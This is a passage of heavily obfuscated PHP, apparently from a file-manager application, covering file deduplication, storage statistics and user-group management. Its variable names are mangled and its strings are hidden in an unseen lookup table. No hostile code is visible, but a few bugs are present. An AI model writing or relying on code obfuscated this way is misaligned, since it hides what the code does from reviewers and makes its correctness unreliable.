$˜æšÑ¹ş[$á¢¢¡ÎÇ][] = $çÙû ñ; } foreach ($˜æšÑ¹ş as $Ä°’…ş¾ => $ÈŒ‘¢¾Ô) { if (!$ÈŒ‘¢¾Ô) { continue; } $Ä°’…ş¾ = $ğ‹ÃåÁ ? $Ä°’…ş¾ : -intval($Ä°’…ş¾); $é†©¼×Ù = array($ÖøîÑ¢÷[534] => array($ÖøîÑ¢÷[7], $ÈŒ‘¢¾Ô)); if ($Ä°’…ş¾ < 0) { $é†©¼×Ù[$ÖøîÑ¢÷[2027]] = array($ÖøîÑ¢÷[1068], abs($Ä°’…ş¾)); } $this->where($é†©¼×Ù)->setAdd($ÖøîÑ¢÷[2027], $Ä°’…ş¾); } } public function findByHash($é›Š‰’«, $åŠ‰Æˆ = false) { $Ë·İ™Ïù =& $_SERVER[è¶³ÒßÑ]; if (!$é›Š‰’« && !$åŠ‰Æˆ) { return !1; } $¿ì¸½“Ì = array($Ë·İ™Ïù[2021] => $é›Š‰’«); if ($åŠ‰Æˆ) { $¿ì¸½“Ì = array($Ë·İ™Ïù[2022] => $åŠ‰Æˆ); } return $this->order($Ë·İ™Ïù[2028])->where($¿ì¸½“Ì)->find(); } public function clearEmpty($ˆ—£èî» = 0) { $Í‘ûñø =& $_SERVER[è¶³ÒßÑ]; $„á±åü× = time() - 3600 * 24 * $ˆ—£èî»; $”¹Šôç = $Í‘ûñø[2029] . $„á±åü×; $ºÈ°š÷² = $this->where($”¹Šôç)->select(); if (!$ºÈ°š÷²) { return; } $Ê¾×¯´ = new Task($Í‘ûñø[2030], $Í‘ûñø[12], count($ºÈ°š÷²)); foreach ($ºÈ°š÷² as $¡ˆÉß”ş) { $Ê¾×¯´->update(1); $this->resetFile($¡ˆÉß”ş); } $Ê¾×¯´->end(); } public function resetFile($„ò‚¯ÆÅ) { $†èÓŞ£ =& $_SERVER[è¶³ÒßÑ]; $Àãå„Ì = array($†èÓŞ£[535] => $„ò‚¯ÆÅ[$†èÓŞ£[534]]); $ëòÚ¤­ = Model($†èÓŞ£[1395])->where($Àãå„Ì)->count(); $ó‰Íàó = Model($†èÓŞ£[2031])->where($Àãå„Ì)->count(); $¿¨ƒŞ÷ = intval($ëòÚ¤­) + intval($ó‰Íàó); if ($¿¨ƒŞ÷ == 0) { IO::remove($„ò‚¯ÆÅ[$†èÓŞ£[97]]); Model($†èÓŞ£[2032])->delete($„ò‚¯ÆÅ[$†èÓŞ£[534]]); $this->where($Àãå„Ì)->delete(); $this->metaSet($„ò‚¯ÆÅ[$†èÓŞ£[534]], null, null); write_log(ACTION . $†èÓŞ£[2033] . KodUser::id() . $†èÓŞ£[2034] . $„ò‚¯ÆÅ[$†èÓŞ£[534]] . $†èÓŞ£[2035] . $„ò‚¯ÆÅ[$†èÓŞ£[89]] . $†èÓŞ£[211] . $„ò‚¯ÆÅ[$†èÓŞ£[97]], $†èÓŞ£[2036]); return; } if ($„ò‚¯ÆÅ[$†èÓŞ£[2027]] != $¿¨ƒŞ÷) { $this->where($Àãå„Ì)->save(array($†èÓŞ£[2020] => $¿¨ƒŞ÷)); } } public function storageInfo($ü’·ÜºÜ = false) { $·ìñ«Â— =& $_SERVER[è¶³ÒßÑ]; $ÜåÜ©‚• = $this->count() + 0.0; $ôáÈ°Ä‰ = 0; $½Œ£Ñ“ê = 1; $êÅ°³£… = 0; $ØÉªÙ¸Â = 5000; for ($êå‹ÅÆ“ = 0; $êå‹ÅÆ“ < $ÜåÜ©‚•; $êå‹ÅÆ“ = $êå‹ÅÆ“ + $ØÉªÙ¸Â) { $¯±²·Ÿˆ = $this->limit($êå‹ÅÆ“, $êå‹ÅÆ“ + $ØÉªÙ¸Â)->select(); foreach ($¯±²·Ÿˆ as $ğ•òì·¦) { $½Œ£Ñ“ê += $ğ•òì·¦[$·ìñ«Â—[89]] * $ğ•òì·¦[$·ìñ«Â—[2027]]; $ôáÈ°Ä‰ += $ğ•òì·¦[$·ìñ«Â—[89]] * ($ğ•òì·¦[$·ìñ«Â—[2027]] - 1); $êÅ°³£… += $ğ•òì·¦[$·ìñ«Â—[2027]]; } } $íêÇ•Á¨ = array($·ìñ«Â—[2037] => $½Œ£Ñ“ê, $·ìñ«Â—[2038] => $ôáÈ°Ä‰, $·ìñ«Â—[2039] => $ôáÈ°Ä‰ / $½Œ£Ñ“ê, $·ìñ«Â—[93] => $ÜåÜ©‚•, $·ìñ«Â—[2040] => $êÅ°³£…); return $íêÇ•Á¨; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\x65" => "\147\x72\x6f\x75\x70\137\x6d\x65\164\141", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\147\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($»¸¬ÇÖ¶) { $¹ëËÓÊ€ =& $_SERVER[è¶³ÒßÑ]; return array($¹ëËÓÊ€[2041] => array($»¸¬ÇÖ¶[0], $¹ëËÓÊ€[2042]), $¹ëËÓÊ€[2043] => array($»¸¬ÇÖ¶[0], $¹ëËÓÊ€[2044])); } protected function getInfo($¨ç•øœ, $”êÑ’¬ˆ = false) { $´™®ó™ƒ = $this->getInfoSimple($¨ç•øœ); if (!$´™®ó™ƒ) { return !1; } if ($”êÑ’¬ˆ) { return $this->_listDataApplyItem($´™®ó™ƒ); } return $this->cacheFunctionGet($_SERVER[è¶³ÒßÑ][2045], $¨ç•øœ); } protected function getInfoSimple($×‰÷Ìõ®, $ˆ­’¬—ô = false) { $º–™ß¡ß =& $_SERVER[è¶³ÒßÑ]; if ($ˆ­’¬—ô) { $®ÌıÑòç = array($º–™ß¡ß[1959] => intval($×‰÷Ìõ®)); $üÏÜ œ¨ = $this->where($®ÌıÑòç)->find(); return is_array($üÏÜ œ¨) ? $üÏÜ œ¨ : array(); } return $this->cacheFunctionGet($º–™ß¡ß[2046], $×‰÷Ìõ®); } protected function groupAdd($û§’Óó) { $©øªá¬É =& $_SERVER[è¶³ÒßÑ]; if (!$û§’Óó[$©øªá¬É[202]] && isset($û§’Óó[$©øªá¬É[1959]]) && $û§’Óó[$©øªá¬É[1959]] == 1) { if ($Šèõ¨á¿ = $this->getInfoSimple($û§’Óó[$©øªá¬É[1959]], !0)) { return $û§’Óó[$©øªá¬É[1959]]; } } else { $Šèõ¨á¿ = $this->getInfoSimple($û§’Óó[$©øªá¬É[202]]); if (!$Šèõ¨á¿) { return !1; } } $ØÖı†ëÒ = $©øªá¬É[587]; if ($Šèõ¨á¿[$©øªá¬É[577]]) { $ØÖı†ëÒ = $Šèõ¨á¿[$©øªá¬É[577]] . $Šèõ¨á¿[$©øªá¬É[1959]] . $©øªá¬É[50]; } $©×ŸÀ®ì = array($©øªá¬É[487] => $this->groupNameAuto($û§’Óó[$©øªá¬É[202]], $û§’Óó[$©øªá¬É[32]]), $©øªá¬É[470] => $û§’Óó[$©øªá¬É[202]], $©øªá¬É[645] => $ØÖı†ëÒ, $©øªá¬É[2047] => $û§’Óó[$©øªá¬É[1946]], $©øªá¬É[2048] => 0, $©øªá¬É[1963] => 0); if (isset($û§’Óó[$©øªá¬É[1983]])) { $©×ŸÀ®ì[$©øªá¬É[1983]] = $û§’Óó[$©øªá¬É[1983]]; } else { $Ğ—œæÒ = $this->max($©øªá¬É[1983]); if (!$Ğ—œæÒ) { $Ğ—œæÒ = 0; } $©×ŸÀ®ì[$©øªá¬É[1983]] = $Ğ—œæÒ + 1; } if (!empty($û§’Óó[$©øªá¬É[1959]])) { $©×ŸÀ®ì[$©øªá¬É[1959]] = $û§’Óó[$©øªá¬É[1959]]; } $Éè®¬”´ = $this->add($©×ŸÀ®ì); $this->setNamePinyin($Éè®¬”´, $©×ŸÀ®ì[$©øªá¬É[32]]); if (isset($û§’Óó[$©øªá¬É[2049]])) { $this->metaSet($Éè®¬”´, array($©øªá¬É[2049] => $û§’Óó[$©øªá¬É[2049]], $©øªá¬É[2050] => $û§’Óó[$©øªá¬É[2050]])); unset($û§’Óó[$©øªá¬É[2049]]); unset($û§’Óó[$©øªá¬É[2050]]); } Model($©øªá¬É[1395])->groupRootAdd($Éè®¬”´); $this->_clearCache($û§’Óó[$©øªá¬É[202]]); return $Éè®¬”´; } protected function groupEdit($šô©Ğ£Ñ, $¯àÈØ¨Ë) { $áÒ¼ªİ• =& $_SERVER[è¶³ÒßÑ]; $Ä¤¶‡ = $this->getInfoSimple($šô©Ğ£Ñ); if (!$Ä¤¶‡) { return !1; } if (!empty($¯àÈØ¨Ë[$áÒ¼ªİ•[202]])) { $¥‰Â„¶ = $this->getInfoSimple($¯àÈØ¨Ë[$áÒ¼ªİ•[202]]); if (!$¥‰Â„¶) { return !1; } if ($Ä¤¶‡[$áÒ¼ªİ•[1959]] == $¥‰Â„¶[$áÒ¼ªİ•[1959]]) { return !1; } if ($¯àÈØ¨Ë[$áÒ¼ªİ•[202]] != $Ä¤¶‡[$áÒ¼ªİ•[202]]) { if ($¥‰Â„¶[$áÒ¼ªİ•[577]] !== $Ä¤¶‡[$áÒ¼ªİ•[577]] && strpos($¥‰Â„¶[$áÒ¼ªİ•[577]], $Ä¤¶‡[$áÒ¼ªİ•[577]] . $Ä¤¶‡[$áÒ¼ªİ•[1959]] . $áÒ¼ªİ•[50]) === 0) { return !1; } $¯àÈØ¨Ë[$áÒ¼ªİ•[645]] = $¥‰Â„¶[$áÒ¼ªİ•[577]] . $¯àÈØ¨Ë[$áÒ¼ªİ•[202]] . $áÒ¼ªİ•[50]; $this->_changeChildLevel($Ä¤¶‡, $¥‰Â„¶); $this->_clearCache($¥‰Â„¶[$áÒ¼ªİ•[1959]]); $this->_clearCache($Ä¤¶‡[$áÒ¼ªİ•[202]]); } } if (isset($¯àÈØ¨Ë[$áÒ¼ªİ•[32]])) { $this->setNamePinyin($šô©Ğ£Ñ, $¯àÈØ¨Ë[$áÒ¼ªİ•[32]]); } if (isset($¯àÈØ¨Ë[$áÒ¼ªİ•[2049]])) { $this->metaSet($šô©Ğ£Ñ, array($áÒ¼ªİ•[2049] => $¯àÈØ¨Ë[$áÒ¼ªİ•[2049]], $áÒ¼ªİ•[2050] => $¯àÈØ¨Ë[$áÒ¼ªİ•[2050]])); unset($¯àÈØ¨Ë[$áÒ¼ªİ•[2049]]); unset($¯àÈØ¨Ë[$áÒ¼ªİ•[2050]]); } $this->_clearChildrenCache($Ä¤¶‡); return $this->where(array($áÒ¼ªİ•[2051] => $šô©Ğ£Ñ))->save($¯àÈØ¨Ë); } private function _clearChildrenCache($é­˜¥±ˆ) { $§õˆıØŒ =& $_SERVER[è¶³ÒßÑ]; $·ÂâÒã = array($§õˆıØŒ[645] => array($§õˆıØŒ[605], $é­˜¥±ˆ[$§õˆıØŒ[577]] . $é­˜¥±ˆ[$§õˆıØŒ[1959]] . $§õˆıØŒ[606])); $ÈÖêÚêŠ = $this->field($§õˆıØŒ[1959])->where($·ÂâÒã)->select(); foreach ($ÈÖêÚêŠ as $£ä‡²‹) { $this->_clearCache($£ä‡²‹[$§õˆıØŒ[1959]]); } } private function _clearCache($ÌäÕ³²­) { $Íôš£õ =& $_SERVER[è¶³ÒßÑ]; $this->cacheFunctionClear($Íôš£õ[2045], $ÌäÕ³²­); $this->cacheFunctionClear($Íôš£õ[2046], $ÌäÕ³²­); } private function _changeChildLevel($¾øÏ˜÷, $†šÇ¹Ü°, $ğ¯†áÃ¢ = false) { $ïÄëƒÍ =& $_SERVER[è¶³ÒßÑ]; $Š˜¾Üşè = $¾øÏ˜÷[$ïÄëƒÍ[577]] . $¾øÏ˜÷[$ïÄëƒÍ[1959]] . $ïÄëƒÍ[50]; $Ëá•÷á = $†šÇ¹Ü°[$ïÄëƒÍ[577]] . $†šÇ¹Ü°[$ïÄëƒÍ[1959]] . $ïÄëƒÍ[50] . $¾øÏ˜÷[$ïÄëƒÍ[1959]] . $ïÄëƒÍ[50]; if ($ğ¯†áÃ¢) { $Ëá•÷á = $†šÇ¹Ü°[$ïÄëƒÍ[577]] . $†šÇ¹Ü°[$ïÄëƒÍ[1959]] . $ïÄëƒÍ[50]; } $®¯×‹µã = array($ïÄëƒÍ[645] => array($ïÄëƒÍ[605], $¾øÏ˜÷[$ïÄëƒÍ[577]] . $¾øÏ˜÷[$ïÄëƒÍ[1959]] . $ïÄëƒÍ[606])); $õıºê‘¦ = array($ïÄëƒÍ[645] => array($ïÄëƒÍ[654], "\162\145\x70\154\141\x63\145\x28\160\x61\x72\145\x6e\164\114\145\166\145\154\54\47{$Š˜¾Üşè}\47\54\47{$Ëá•÷á}\x27\x29")); $this->_clearChildrenCache($¾øÏ˜÷); $this->where($®¯×‹µã)->data($õıºê‘¦)->save(); } public function setNamePinyin($ìŸœ‚Âî, $†÷À´… = false) { $ä‹î†— =& $_SERVER[è¶³ÒßÑ]; if (!$†÷À´…) { $ôÜ¿¿õæ = $this->getInfoSimple($ìŸœ‚Âî); $†÷À´… = $ôÜ¿¿õæ[$ä‹î†—[32]]; } if (!Input::check($†÷À´…, $ä‹î†—[648])) { $this->metaSet($ìŸœ‚Âî, $ä‹î†—[531], null); $this->metaSet($ìŸœ‚Âî, $ä‹î†—[530], null); return; } $ê£“ê–µ = array($ä‹î†—[531] => str_replace($ä‹î†—[53], $ä‹î†—[12], Pinyin::get($†÷À´…)), $ä‹î†—[530] => Pinyin::get($†÷À´…, $ä‹î†—[649])); $this->metaSet($ìŸœ‚Âî, $ê£“ê–µ); } protected function groupStatus($Ïê´ÛÎ, $ßÀÕ²ÊŒ) { $×æÍÙ„ä =& $_SERVER[è¶³ÒßÑ]; $‚æñå¤¤ = $this->getInfoSimple($Ïê´ÛÎ); if (!$‚æñå¤¤) { return !1; } $this->_clearCache($Ïê´ÛÎ); return $this->metaSet($Ïê´ÛÎ, $×æÍÙ„ä[804], $ßÀÕ²ÊŒ); if ($ßÀÕ²ÊŒ == $×æÍÙ„ä[101]) { $Şî§Îï = $this->parentLevelArray($‚æñå¤¤[$×æÍÙ„ä[577]]); } else { } $Şî§Îï[] = $‚æñå¤¤[$×æÍÙ„ä[1959]]; $ÇË¨ = array(); foreach ($Şî§Îï as $Ïê´ÛÎ) { $ÇË¨[] = array($×æÍÙ„ä[1959] => $Ïê´ÛÎ, $×æÍÙ„ä[107] => $×æÍÙ„ä[804], $×æÍÙ„ä[443] => $ßÀÕ²ÊŒ); $this->_clearCache($Ïê´ÛÎ); } return Model($×æÍÙ„ä[2052])->addAll($ÇË¨, array(), !0); } protected function groupRemove($²Ûæ¦€Ï, $â’áš¦ø = false) { $€İ¶óúĞ =& $_SERVER[è¶³ÒßÑ]; $ƒ¾£–€ä = array($€İ¶óúĞ[1959] => $²Ûæ¦€Ï); $¦•¤ö¢Ê = $this->where($ƒ¾£–€ä)->find(); if (!$¦•¤ö¢Ê || $¦•¤ö¢Ê[$€İ¶óúĞ[202]] == 0) { return !1; } if (!$â’áš¦ø) { $ô¾¯ £ = $this->getInfoSimple($¦•¤ö¢Ê[$€İ¶óúĞ[202]]); $this->_changeChildLevel($¦•¤ö¢Ê, $ô¾¯ £, !0); $this->where(array($€İ¶óúĞ[202] => $²Ûæ¦€Ï))->save(array($€İ¶óúĞ[202] => $¦•¤ö¢Ê[$€İ¶óúĞ[202]])); $this->_clearCache($ô¾¯ £[$€İ¶óúĞ[1959]]); } Model($€İ¶óúĞ[2052])->where($ƒ¾£–€ä)->delete(); Model($€İ¶óúĞ[2053])->where($ƒ¾£–€ä)->delete(); Model($€İ¶óúĞ[878])->groupRootRemove($²Ûæ¦€Ï); $this->_clearCache($¦•¤ö¢Ê[$€İ¶óúĞ[202]]); return $this->where($ƒ¾£–€ä)->delete(); } protected function groupSort($¦­ä¼ÖÏ) { $•Ğ÷“™ˆ =& $_SERVER[è¶³ÒßÑ]; $—×˜¦Ûœ = array(); foreach ($¦­ä¼ÖÏ as $Ç¿ğ°Ğ => $şø®³å) { $—×˜¦Ûœ[] = array($•Ğ÷“™ˆ[1959], $şø®³å, $•Ğ÷“™ˆ[1983], $Ç¿ğ°Ğ + 1); } $this->saveAll($—×˜¦Ûœ); } public function listData() { $¾®Ó‰Ï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¾®Ó‰Ï[$_SERVER[è¶³ÒßÑ][438]]); return $¾®Ó‰Ï; } private function _makeOrder($¤Ì›ú‚‘ = '') { $± Öóîè =& $_SERVER[è¶³ÒßÑ]; $ò—ûƒ¸ = array($± Öóîè[1959], $± Öóîè[32], $± Öóîè[1948], $± Öóîè[241]); $‹¼Ñ Ç = array($± Öóîè[516] => $± Öóîè[517], $± Öóîè[518] => $± Öóîè[519]); $õ„‚…ª€ = Input::get($± Öóîè[523], $± Öóîè[7], $± Öóîè[1963], $ò—ûƒ¸); $€‹„ÖÁ = Input::get($± Öóîè[524], $± Öóîè[7], $± Öóîè[2054], array($± Öóîè[2054], $± Öóîè[518])); $€‹„ÖÁ = $‹¼Ñ Ç[$€‹„ÖÁ]; $¤Ì›ú‚‘ = $¤Ì›ú‚‘ . "{$õ„‚…ª€}\40{$€‹„ÖÁ}\54\40\147\162\157\165\x70\x49\104\40\x61\163\x63"; return $this->order($¤Ì›ú‚‘); } public function listChild($Ùœà÷¶ã) { $´ƒñ¹ƒØ =& $_SERVER[è¶³ÒßÑ]; $’òÖŒ–÷ = $this->where(array($´ƒñ¹ƒØ[202] => $Ùœà÷¶ã))->_makeOrder()->selectPage(200); $this->_listDataApply($’òÖŒ–÷[$´ƒñ¹ƒØ[438]]); return $’òÖŒ–÷; } public function listChildIds($³ö›ä) { $ÔƒÕ©Û =& $_SERVER[è¶³ÒßÑ]; if (is_string($¤²‹ää¨)) { $³ö›ä = explode($ÔƒÕ©Û[50], $³ö›ä); } $§Ş³÷Ö— = $this->where(array($ÔƒÕ©Û[1959] => array($ÔƒÕ©Û[7], $³ö›ä)))->field($ÔƒÕ©Û[2055])->select(); if (!$§Ş³÷Ö—) { return !1; } $¶Õøİ§¿ = array(); foreach ($§Ş³÷Ö— as $–µúÚÙ) { $¶Õøİ§¿[] = "\163\x65\154\145\x63\164\x20\147\x72\x6f\165\x70\x49\x44\x20\x66\162\157\155\40\140\147\x72\x6f\165\x70\140\40\x77\150\x65\x72\x65\x20\160\x61\x72\145\x6e\164\114\145\x76\x65\x6c\x20\154\x69\x6b\145\40\47{$–µúÚÙ[$ÔƒÕ©Û[577]]}{$–µúÚÙ[$ÔƒÕ©Û[1959]]}\x2c\x25\x27"; } $¶Õøİ§¿ = implode($ÔƒÕ©Û[2056], $¶Õøİ§¿); $§Ş³÷Ö— = $this->query($¶Õøİ§¿); if (!$§Ş³÷Ö—) { return array(); } $³ö›ä = array_to_keyvalue($§Ş³÷Ö—, $ÔƒÕ©Û[12], $ÔƒÕ©Û[1959]); return array_unique($³ö›ä); } public function listByID($‹”šİØõ) { $Âü×…ëä =& $_SERVER[è¶³ÒßÑ]; if (!$‹”šİØõ) { return array(); } $ê»’ø© = array($Âü×…ëä[1959] => array($Âü×…ëä[7], $‹”šİØõ)); $ˆßøõ¼ = $this->where($ê»’ø©)->select(); $ˆßøõ¼ = array_sort_keep($ˆßøõ¼, $Âü×…ëä[1959], $‹”šİØõ); $this->_listDataApply($ˆßøõ¼); return $ˆßøõ¼; } public function listSearch($ŒêÉ¦’Ö) { $øÚØÍª =& $_SERVER[è¶³ÒßÑ]; $Ãå»æ = trim($ŒêÉ¦’Ö[$øÚØÍª[2057]]); $™»˜üˆó = explode($øÚØÍª[53], $Ãå»æ); if (!$Ãå»æ || count($™»˜üˆó) == 1) { return $this->listSearchNow($ŒêÉ¦’Ö); } $İİ¸„²Ó = array($øÚØÍª[438] => array()); foreach ($™»˜üˆó as $¨ş¬•¹å) { if (!trim($¨ş¬•¹å)) { continue; } $ŒêÉ¦’Ö[$øÚØÍª[2057]] = $¨ş¬•¹å; $§”à¾ñ = $this->listSearchNow($ŒêÉ¦’Ö); $İİ¸„²Ó[$øÚØÍª[438]] = array_merge($İİ¸„²Ó[$øÚØÍª[438]], $§”à¾ñ[$øÚØÍª[438]]); } $İİ¸„²Ó[$øÚØÍª[438]] = array_unique_by_key($İİ¸„²Ó[$øÚØÍª[438]], $øÚØÍª[1959]); $İİ¸„²Ó[$øÚØÍª[435]] = array($øÚØÍª[436] => count($İİ¸„²Ó[$øÚØÍª[438]]), $øÚØÍª[432] => 20, $øÚØÍª[422] => 1, $øÚØÍª[437] => 1); return $İİ¸„²Ó; } public function listSearchNow($Ò²½ µ¢) { $¾ñª”·Â =& $_SERVER[è¶³ÒßÑ]; $şÃíØÛÉ = trim($Ò²½ µ¢[$¾ñª”·Â[2057]]); $İûĞè— = isset($Ò²½ µ¢[$¾ñª”·Â[2058]]) ? $Ò²½ µ¢[$¾ñª”·Â[2058]] : !1; if (!trim($şÃíØÛÉ)) { return !1; } $şÃíØÛÉ = str_replace($¾ñª”·Â[2059], $¾ñª”·Â[2060], $şÃíØÛÉ); $ÚÚîğß = array($¾ñª”·Â[1959] => array($¾ñª”·Â[452], "{$şÃíØÛÉ}\45"), $¾ñª”·Â[32] => array($¾ñª”·Â[452], "\x25{$şÃíØÛÉ}\45"), $¾ñª”·Â[1053] => $¾ñª”·Â[2061]); if ($İûĞè—) { $ÎÅçÖ»Ì = $this->getInfoSimple($İûĞè—); $² •„†Å = $ÎÅçÖ»Ì[$¾ñª”·Â[577]] . $İûĞè— . $¾ñª”·Â[606]; $ÚÚîğß = array($ÚÚîğß, array($¾ñª”·Â[577] => array($¾ñª”·Â[452], $² •„†Å))); } $ÚÚîğß = $this->parseWhereLike($ÚÚîğß); $ÀŒï½à = $this->_makeOrder()->where($ÚÚîğß)->selectPage(20); $ÀŒï½à = $ÀŒï½à ? $ÀŒï½à : array($¾ñª”·Â[438] => array(), $¾ñª”·Â[435] => array()); if (!$ÀŒï½à || count($ÀŒï½à[$¾ñª”·Â[438]]) < 5 && Input::check($şÃíØÛÉ, $¾ñª”·Â[387])) { $ŠÑı†¡î = $this->groupChildrenAll($İûĞè—); $œÁ‘€´Í = $this->_searchFromMeta($¾ñª”·Â[530], $şÃíØÛÉ, 10, $ŠÑı†¡î); $ªøş÷”¦ = $this->_searchFromMeta($¾ñª”·Â[531], $şÃíØÛÉ, 10, $ŠÑı†¡î); $£Æêèº = array_merge($œÁ‘€´Í, $ªøş÷”¦, $ÀŒï½à[$¾ñª”·Â[438]]); $ÀŒï½à[$¾ñª”·Â[438]] = array_unique_by_key($£Æêèº, $¾ñª”·Â[1959]); $ÀŒï½à[$¾ñª”·Â[435]][$¾ñª”·Â[436]] = count($ÀŒï½à[$¾ñª”·Â[438]]); $ÀŒï½à[$¾ñª”·Â[435]][$¾ñª”·Â[437]] = ceil($ÀŒï½à[$¾ñª”·Â[435]][$¾ñª”·Â[436]] / $ÀŒï½à[$¾ñª”·Â[435]][$¾ñª”·Â[432]]); } $this->_listDataApply($ÀŒï½à[$¾ñª”·Â[438]]); return $ÀŒï½à; } protected function groupChildrenAll($²üÂƒ¸ô) { $Ù“ÙÆİô =& $_SERVER[è¶³ÒßÑ]; if (!$²üÂƒ¸ô) { return !1; } if (!is_array($²üÂƒ¸ô)) { $²üÂƒ¸ô = array($²üÂƒ¸ô); } $ïÇ÷™è = $²üÂƒ¸ô; foreach ($²üÂƒ¸ô as $Ù¬³ĞòÅ) { $Ìõ¿Ì…Û = $this->getInfoSimple($Ù¬³ĞòÅ); $ï€·şŞû = array($Ù“ÙÆİô[577] => array($Ù“ÙÆİô[452], $Ìõ¿Ì…Û[$Ù“ÙÆİô[577]] . $Ù¬³ĞòÅ . $Ù“ÙÆİô[606])); $Ã’¿í¶¶ = $this->field($Ù“ÙÆİô[1959])->where($ï€·şŞû)->select(); $ïÇ÷™è = array_merge($ïÇ÷™è, array_to_keyvalue($Ã’¿í¶¶, $Ù“ÙÆİô[12], $Ù“ÙÆİô[1959])); } return array_unique($ïÇ÷™è); } private function _searchFromMeta($£ä–áÌõ, $šÄŠÕÌ—, $¼«´¢„Ú, $²ÖúÄØ) { $“Ê¶ëú‚ =& $_SERVER[è¶³ÒßÑ]; $šÄŠÕÌ— = strtolower($šÄŠÕÌ—); $·²€ ÚÑ = array($“Ê¶ëú‚[107] => $£ä–áÌõ, $“Ê¶ëú‚[443] => array($“Ê¶ëú‚[452], "\45{$šÄŠÕÌ—}\45")); $·²€ ÚÑ = $this->parseWhereLike($·²€ ÚÑ); if ($²ÖúÄØ) { $·²€ ÚÑ[$“Ê¶ëú‚[1959]] = array($“Ê¶ëú‚[7], $²ÖúÄØ); } $Ò¸ØÚ¬ = Model($“Ê¶ëú‚[2062])->where($·²€ ÚÑ)->limit($¼«´¢„Ú)->select(); if (!$Ò¸ØÚ¬) { return array(); } $Ò¸ØÚ¬ = array_to_keyvalue($Ò¸ØÚ¬, $“Ê¶ëú‚[12], $“Ê¶ëú‚[1959]); $…°„á¹ = $this->where(array($“Ê¶ëú‚[2051] => array($“Ê¶ëú‚[7], $Ò¸ØÚ¬)))->select(); if (!$…°„á¹) { return array(); } return $…°„á¹; } protected function _listDataApplyItem($¼Äñ€Œô) { $‹±óÒ‚ğ = array($¼Äñ€Œô); $this->_listDataApply($‹±óÒ‚ğ); return $‹±óÒ‚ğ[0]; } protected function _listDataApply(&$€äİÔƒØ) { $˜Åİ±†Ş =& $_SERVER[è¶³ÒßÑ]; if (!$€äİÔƒØ) { return; } $‘›§Ô÷ù = array_to_keyvalue($€äİÔƒØ, $˜Åİ±†Ş[12], $˜Åİ±†Ş[1959]); $this->_listAppendChildren($€äİÔƒØ); $this->_listAppendChildrenMember($€äİÔƒØ); $this->_listAppendMeta($€äİÔƒØ, $‘›§Ô÷ù); $this->_listAppendParent($€äİÔƒØ); $this->_listAppendSourceRoot($€äİÔƒØ, $‘›§Ô÷ù); } private function _listAppendChildren(&$ş‡˜ˆœõ) { $Üİé¦Ï =& $_SERVER[è¶³ÒßÑ]; $ºÎ—ÈÓÌ = array_to_keyvalue($ş‡˜ˆœõ, $Üİé¦Ï[12], $Üİé¦Ï[1959]); $é»¦­ = array($Üİé¦Ï[202] => array($Üİé¦Ï[7], $ºÎ—ÈÓÌ)); $®¸¹ôÜ¨ = array($Üİé¦Ï[202], $Üİé¦Ï[2063] => $Üİé¦Ï[558]); $äÂ±‡ø¿ = $this->field($®¸¹ôÜ¨)->where($é»¦­)->group($Üİé¦Ï[202])->select(); $™—™”§ = array_to_keyvalue($äÂ±‡ø¿, $Üİé¦Ï[202], $Üİé¦Ï[558]); foreach ($ş‡˜ˆœõ as &$«Œ¿—ø¾) { $ò·±Şª = $«Œ¿—ø¾[$Üİé¦Ï[1959]]; $«Œ¿—ø¾[$Üİé¦Ï[2064]] = isset($™—™”§[$ò·±Şª]) ? intval($™—™”§[$ò·±Şª]) : !1; } unset($«Œ¿—ø¾); } private function _listAppendChildrenMember(&$·íë©º) { $ƒ—ÀŞºà =& $_SERVER[è¶³ÒßÑ]; $ê¦ù»Ÿ¤ = array_to_keyvalue($·íë©º, $ƒ—ÀŞºà[12], $ƒ—ÀŞºà[1959]); $Õğíçšù = array($ƒ—ÀŞºà[1959] => array($ƒ—ÀŞºà[7], $ê¦ù»Ÿ¤)); $ŞşŠ€ÖÓ = array($ƒ—ÀŞºà[1959], $ƒ—ÀŞºà[2063] => $ƒ—ÀŞºà[558]); $—ñšŒñ = Model($ƒ—ÀŞºà[2053])->field($ŞşŠ€ÖÓ)->where($Õğíçšù)->group($ƒ—ÀŞºà[1959])->select(); $ ¹¿œÑİ = array_to_keyvalue($—ñšŒñ, $ƒ—ÀŞºà[1959], $ƒ—ÀŞºà[558]); foreach ($·íë©º as &$Î¾®§åÔ) { $“Ìä¢ÔŒ = $Î¾®§åÔ[$ƒ—ÀŞºà[1959]]; $Î¾®§åÔ[$ƒ—ÀŞºà[2065]] = isset($ ¹¿œÑİ[$“Ìä¢ÔŒ]) ? intval($ ¹¿œÑİ[$“Ìä¢ÔŒ]) : !1; } unset($Î¾®§åÔ); } private function _listAppendMeta(&$“°“üê, $Ü¸®®Ñ¦) { $Ëî’Û»˜ =& $_SERVER[è¶³ÒßÑ]; $«“¨ò°” = array($Ëî’Û»˜[1959] => array($Ëî’Û»˜[7], $Ü¸®®Ñ¦)); $Îó’“Ã = Model($Ëî’Û»˜[2052])->where($«“¨ò°”)->select(); $Îó’“Ã = array_to_keyvalue_group($Îó’“Ã, $Ëî’Û»˜[1959]); foreach ($Îó’“Ã as &$Á—Ú·¾—) { $Á—Ú·¾— = array_to_keyvalue($Á—Ú·¾—, $Ëî’Û»˜[107], $Ëî’Û»˜[443]); } unset($Á—Ú·¾—); foreach ($“°“üê as &$Ú£Ò€Â) { $Ú£Ò€Â[$Ëî’Û»˜[532]] = array(); if (isset($Îó’“Ã[$Ú£Ò€Â[$Ëî’Û»˜[1959]]])) { $Ú£Ò€Â[$Ëî’Û»˜[532]] = $Îó’“Ã[$Ú£Ò€Â[$Ëî’Û»˜[1959]]]; } } unset($Ú£Ò€Â); } protected function parentLevelArray($éœ¢×î¢) { $ä‡¥Ó­Î =& $_SERVER[è¶³ÒßÑ]; $éœ¢×î¢ = explode($ä‡¥Ó­Î[50], trim($éœ¢×î¢, $ä‡¥Ó­Î[50])); $éœ¢×î¢ = array_remove_value($éœ¢×î¢, $ä‡¥Ó­Î[238]); return $éœ¢×î¢; } protected function parentInGroup($ÃÎ˜Æìû, $¹¯‘„°†) { $ºª¨Ãİ =& $_SERVER[è¶³ÒßÑ]; $î¤—ÆÔ˜ = $this->getInfoSimple($ÃÎ˜Æìû); if (!$î¤—ÆÔ˜) { return !0; } $Áˆš·ĞÜ = $this->parentLevelArray($î¤—ÆÔ˜[$ºª¨Ãİ[577]]); 